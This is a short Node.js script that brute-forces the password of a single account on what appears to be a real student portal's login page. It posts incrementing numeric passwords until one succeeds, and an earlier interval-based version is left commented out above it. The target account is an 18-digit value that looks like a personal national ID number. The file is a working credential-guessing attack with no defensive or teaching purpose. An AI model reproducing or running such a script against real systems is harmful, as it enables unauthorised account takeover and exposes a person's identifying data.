var request = require('request');

/*function hack(pass) {
	request.post({
		//method: "post",
		url: "http://stu.1000phone.net/student.php/Public/login",
		formData: {
			"Account": "362524199301274017",
			"PassWord": pass
		}
	}, (err, res, body) => {
		if(body) {
			console.log("失败", pass)
		} else {
			console.log("成功", pass)
			clearInterval(timer);
		}
		//console.log(body)
	})
}

let num = 270000;
let timer = setInterval(() => {
	hack(num);
	num++;
})*/
let num = 273700;

function hack() {
	num++;
	request.post({
		//method: "post",
		url: "http://stu.1000phone.net/student.php/Public/login",
		formData: {
			"Account": "362524199301274017",
			"PassWord": num
		}
	}, (err, res, body) => {
		if(body) {
			console.log("失败",num)
			hack();
		} else {
			console.log("成功",num)
			return;
		}
		//console.log(body)
	})
}
hack();
